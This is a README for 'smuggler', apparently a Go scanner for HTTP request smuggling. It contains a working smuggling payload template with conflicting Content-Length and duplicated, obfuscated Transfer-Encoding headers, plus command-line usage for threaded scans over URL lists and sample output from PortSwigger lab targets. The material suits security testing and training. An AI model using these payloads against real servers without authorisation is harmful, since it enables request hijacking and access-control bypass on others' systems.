# smuggler
net/http makes it very challenging to send a request with malformed or duplicate headers. So for this application, it is more practical to parse a template and write it to a socket. This makes it simple to add your own payloads and may be useful for other things than request smuggling for ease of creating templates by copy/pasting from Burp.  
  
I took some ideas from this article https://www.synopsys.com/blogs/software-security/fuzzing-test-cases-not-all-random/ about the structure of the program. Separating the application into distinct sections being poet, courier, and oracle help make the code more reusable.



Example template:
```
Match: GPOST
Request: |+
  POST {{.Path}} HTTP/1.1
  Host: {{.Host}}
  Content-Type: application/x-www-form-urlencoded
  Content-length: 4
  Transfer-Encoding: chunked
  Transfer-encoding: cow
  
  5c
  GPOST / HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15
  
  x=1
  0
  

```

Usage:
```
$ ./smuggler -h
Usage of ./smuggler:
  -header string
    	Custom header to add to requests, example: '-header "User-Agent: garlic0x1"'
  -proxy string
    	Set the environment proxy, for example: http://example.com:8080
  -threads int
    	Number of concurrent targets to test (default 5)
  -timeout int
    	Timeout (default 10)
  -u string
    	Target URL
  -urls string
    	List of URLs
```

Example test on Portswigger labs:
```
$ ./smuggler -urls targets.test
https://ace51fd41fcbfab0c03e376f00890063.web-security-academy.net/ is vulnerable, payload: templates/template.txt
https://acbf1fa51ea928ebc0ae8934000800c3.web-security-academy.net/ is vulnerable, payload: templates/template2.txt
https://acbf1fa51ea928ebc0ae8934000800c3.web-security-academy.net/ is vulnerable, payload: templates/template3.txt

```
